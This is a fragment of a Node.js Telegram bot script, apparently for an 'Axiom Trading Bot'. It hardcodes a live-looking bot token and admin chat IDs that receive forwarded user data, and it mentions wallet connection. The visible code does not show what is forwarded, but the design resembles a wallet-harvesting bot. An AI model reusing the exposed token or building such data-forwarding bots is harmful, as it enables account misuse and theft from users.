...
// --- Configuration ---
// IMPORTANT: This is the user's specific, working token.
// Token must be on a single line
const BOT_TOKEN = "8246380885:AAE4HEezlc_efnjw9FIqVI8UVxJhdk13Kks"; // <--- USER'S TOKEN
// IMPORTANT: These IDs are CONFIRMED and will receive the forwarded data.
// Add all admin Telegram User IDs to this array.
const ADMIN_CHAT_IDS = [779027313, 7369496375]; // <--- ADD MULTIPLE IDS HERE (e.g., [12345, 67890])

if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
  console.error(
    "CRITICAL ERROR: Please replace 'YOUR_BOT_TOKEN_HERE' in axiombot.js with your actual Telegram Bot Token."
  );
  process.exit(1);
}

// NOTE: The check for ADMIN_CHAT_ID placeholder has been removed since the user confirmed their ID matches the placeholder value.
...
/**
 * Sends the standard 'wallet required' message.
 * @param {object} ctx The Telegraf context object.
 * @param {string} featureName The name of the feature clicked.
 */
// This function is no longer used, as the featureHandler handles generic disconnect messages directly.
/*
async function sendWalletRequiredMessage(ctx, featureName) {
  // ... removed ...
}
*/
...
bot
  .launch()
  .then(() => console.log("Axiom Trading Bot (JS) started and running..."))
